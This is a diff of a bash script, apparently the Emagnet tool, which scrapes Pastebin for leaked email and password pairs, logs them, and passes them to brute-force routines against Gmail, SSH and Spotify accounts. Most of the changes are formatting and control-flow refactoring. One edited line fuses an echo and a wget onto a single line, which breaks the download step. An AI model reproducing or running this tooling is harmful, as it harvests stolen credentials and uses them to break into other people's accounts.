@@ -565,7 +565,7 @@ fi
   printf "%s\n" "Copying files to archive.."
     	cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
     	cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
-   	 cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
+   	cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
   printf "%s\n\n" "All files has been copied to archive.."
 
 
@@ -725,7 +725,8 @@ fi
 }
 
 emagnet_syntax() {
-     emagnet_conf
+emagnet_conf
+
 if [[ -z "$USERAGENT" ]]; then
   echo -e "$basename$0: internal errror -- you must set a valid useragent in $CONF"
   exit 1
@@ -795,20 +796,19 @@ emagnet_conf
 
    if [[ "$(cat /tmp/.emagnet1|wc -l)" = "8" ]]; then emagnet_notice_about_scraping;fi
    if [[ "$(cat /tmp/.emagnet1|grep https)" = "0" ]]; then emagnet_heavyload;emagnet_I_was_banned;fi
+   xargs -P "${THREADS}" -n 1 wget -q -nc -P "$EMAGNETTEMP" < /tmp/.emagnet &> /dev/null
+   tt="$(cat /tmp/.emagnet| wc -l)";if [[ "$tt" -lt "10" ]]; then tt="0$tt";fi
 
-	xargs -P "${THREADS}" -n 1 wget -q -nc -P "$EMAGNETTEMP" < /tmp/.emagnet
-	tt="$(cat /tmp/.emagnet| wc -l)";if [[ "$tt" -lt "10" ]]; then tt="0$tt";fi
-
-if [[ "${tt}" -eq "0" ]]; then
-  curl -Ls "$PASTEBIN"|grep -q "blocked"
+if [[ "${tt}" -eq "00" && "${tt}" -eq "0" ]]; then
+  curl -H "$USERAGENT" -Ls "$PASTEBIN"|grep -q "blocked"
     if [[ "$?" = "0" ]]; then
       emagnet_heavyload
       emagnet_I_was_banned
     fi
- grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|cut -d: -f1|tr ' ' '\n'
- printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned within seconds..\n\n"
-      tt="\e[1;31m\e[5m00\e[0m"
-      sleep 5;emagnet_clear;emagnet_banner
+	 grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|cut -d: -f1|tr ' ' '\n'
+	 printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned within seconds..\n\n"
+   	 tt="\e[1;31m\e[5m00\e[0m"
+      	 sleep 5;emagnet_clear;emagnet_banner
  else
      echo -e "\n======================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n======================================"  >> "$EMAGNETLOGS/pastebin-urls.txt"
      cat "/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
@@ -817,14 +817,14 @@ fi
 i=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|cut -d: -f1|tr ' ' '\n')
 il=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d: -f2|tr ' ' '\n')
 it=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|wc -l|tr ' ' '\n')
+
 p=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
 pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S' |sed 's/|/:/g'|tr ' ' '\n')
 pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)
 
-#((10#0$it > 00))
-#((10#0$pt > 00))
+   ((10#0$it > 00));((10#0$pt > 00))
 
-if [[ "$it" -gt "0" ]] && [[ "$pt" -gt "0" ]]; then
+if [[ "$it" -gt "00" ]] && [[ "$pt" -gt "00" ]]; then
      echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found: ${pt} passwords from: $EMAGNETPW/${i##*/}" | xargs >> "$EMAGNETLOGS/emagnet.log"
      echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${it} email addresses from $EMAGNETDB/${i##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP" \
@@ -836,66 +836,77 @@ if [[ "$it" -gt "0" ]] && [[ "$pt" -gt "0" ]]; then
     |grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts' \
     |grep -v '/' >> "$EMAGNETLOGS/passwords-from-pastebin.txt"
      grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP" |cut -d':' -f2 |uniq >> "$EMAGNETLOGS/emails-from-pastebin.txt"
-     
-  printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
-  printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n"
-  printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
 
-   if [[ "$NOTIFY" = "true" ]]; then notify-send "Emagnet" "\n${tt} - Files downloaded\n ${pt} - Passwords found\n${it} - Email addresses found";fi
-    cp -rn "${p}" "$EMAGNETPW/" &> /dev/null
-    cp -rn "${i}" "$EMAGNETDB/" &> /dev/null
-    rm "/tmp/.emagnet*"  &> /dev/null
-    sleep 2
+   printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
+   printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n"
+   printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
 
-   if [[ "$GBRUTEFORCE" = "true" ]]; then
+   if [[ "$NOTIFY" = "true" ]]; then
+    notify-send "Emagnet" "\n
+    ${tt} - Files downloaded\n
+    ${pt} - Passwords found\n
+    ${it} - Email addresses found"
+   fi
+
+ if [[ "$GBRUTEFORCE" = "true" ]]; then
        printf "%64s \n\n" | tr ' ' '='
        printf "%17s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
        emagnet_gmail_bruter
-    elif [[ "$SBRUTEFORCE" = "true" ]]; then
-     ( hash "parallel" &> /dev/null;[[ "$?" -ne "0" ]] && echo -e "$basename$0: internal error -- parallel package is required to be installed.."; exit 1 )
-      printf "%64s \n\n" | tr ' ' '='
-      printf "%19s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
-      emagnet_ssh_bruter
-    elif [[ "$PBRUTEFORCE" = "true" ]]; then
+  elif [[ "$SBRUTEFORCE" = "true" ]]; then
+   printf "%64s \n\n" | tr ' ' '='
+   printf "%19s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
+   emagnet_ssh_bruter
+  elif [[ "$PBRUTEFORCE" = "true" ]]; then
       printf "%64s \n\n" | tr ' ' '='
       printf "%17s";printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
       emagnet_spotify_bruter
-    else
+ else
      sleep 0
-  fi
+ fi
      sleep 1
-  cp -rn "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
-    elif [[ "$pt" = "0" ]] && [[ "$it" -gt "0" ]]; then
-       cp -rn "${i}" "$EMAGNETDB/" &> /dev/null
+
+
+    elif [[ "$pt" = "00" ]] && [[ "$it" -gt "00" ]]; then
+       cp -rn ${i} $EMAGNETDB/ &> /dev/null
+        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
          echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${it} email addresses from $EMAGNETDB/${i##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
-            grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d':' -f2|uniq >> "$EMAGNETLOGS/emails-from-pastebin.txt"
-                sleep 2
-                    if [[ "$SBRUTEFORCE" = "true" ]]; then
-                          cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
-                    elif [[ "$GBRUTEFORCE" = "true" ]]; then
-                          cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
-                    elif [[ "$PBRUTEFORCE" = "true" ]]; then
-                          cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
-                    else
-                          mv "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null  
-                    fi
-		          mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
-    printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
-    printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
-    printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
-     if [[ "$NOTIFY" = "true" ]]; then notify-send "Emagnet" "\n${tt} - Files downloaded\n 00 - Passwords found\n${it} - Email addresses found";fi
-    sleep 3.2
-else
+          grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d':' -f2|uniq >> "$EMAGNETLOGS/emails-from-pastebin.txt"
+           sleep 2
+            if [[ "$SBRUTEFORCE" = "true" ]]; then
+               cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
+             elif [[ "$GBRUTEFORCE" = "true" ]]; then
+               cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
+             elif [[ "$PBRUTEFORCE" = "true" ]]; then
+               cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
+             else
+               mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+             fi
+
+   printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
+   printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
+   printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
+      if [[ "$NOTIFY" = "true" ]]; then
+     	notify-send "Emagnet" "\n
+      	${tt} - Files downloaded\n
+     	00 - Passwords found\n
+     	${it} - Email addresses found"
+      fi
+  else
     printf "%17s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
     printf "%17s[\e[1;31m00\e[0m] - Passwords Was Found\n\n"
     printf "%17s[\e[1;31m00\e[0m] - Email Address Was Found\n\n"
-     if [[ "$NOTIFY" = "true" ]]; then notify-send "Emagnet" "\n${tt} - Files downloaded\n00 - Passwords found\n00 - Email addresses found";fi
-    sleep 3.2
-fi
-    pkill -9 "notify-send" &> /dev/null
-    mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
-    rm /tmp/.emagnet*  &> /dev/null
+      if [[ "$NOTIFY" = "true" ]]; then
+        notify-send "Emagnet" "\n
+        ${tt} - Files downloaded\n
+        00 - Passwords found\n
+        00 - Email addresses found"
+      fi
+   fi
 
+    mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+    rm "/tmp/.emagnet*"  &> /dev/null
+    sleep 2
+    pkill -9 "notify-send" &> /dev/null
 }
 
 emagnet_run4ever() {
@@ -990,7 +1001,7 @@ case $1 in
                         elif [[ $PBRUTEFORCE = "false" ]]; then 
   			          emagnet_run4ever
                         else
- 			           mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
+            mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
               fi
 		  ;;
 
@@ -1004,15 +1015,21 @@ case $1 in
                           emagnet_gmail_bruter
                           mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
                        fi
-	                           elif [[ $2 = "ssh" ]]; then
-                              	emagnet_conf
-       		                      sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
-                            		emagnet_conf
-      		  
+ 
+                       elif [[ $2 = "ssh" ]]; then
+                         hash "parallel" &> /dev/null
+                          if [[ "$?" -ne "0" ]]; then
+                            echo -e "$basename$0: internal error -- parallel package is required to be installed.."
+                            exit 1
+                           fi
+           emagnet_conf
+       	     sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
+                           emagnet_conf
+
             if [[ $SBRUTEFORCE = "true" ]]; then
                		 emagnet_run4ever
               		 emagnet_ssh_bruter
-        	  fi
+            fi
                 	mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
 
    elif [[ $2 = "spotify" ]]; then
@@ -1041,8 +1058,7 @@ if [[ $? -ne "0" ]]; then
          echo "Sconsify is required to be installed before we attacking targets.."
            read -p "Download and install sconsify (y/N): " installsconsify
              if [[ "$installsconsify" -eq "y" ]]; then
-                echo -e "Hold on, downloading sconsify.."
-                  wget -q "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
+                echo -e "Hold on, downloading sconsify.."                  wget -q "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                 echo -e "Unzipping sconsify into current dir.."
                   unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
                   chmod +x ./sconsify
